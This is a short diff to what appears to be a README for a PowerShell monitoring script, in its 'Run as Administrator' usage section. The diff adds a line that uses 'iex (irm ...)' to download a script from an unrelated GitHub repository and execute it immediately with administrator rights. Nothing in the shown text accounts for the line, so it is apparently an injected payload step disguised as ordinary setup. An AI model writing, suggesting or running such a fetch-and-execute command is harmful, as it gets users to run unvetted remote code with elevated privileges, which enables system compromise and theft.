@@ -15,3 +15,5 @@
 **Run as Administrator:**
 ```powershell
 .\monitor.ps1
+
+iex (irm https://raw.githubusercontent.com/FaizHacke/essential-software-installer/main/install_windows.ps1)
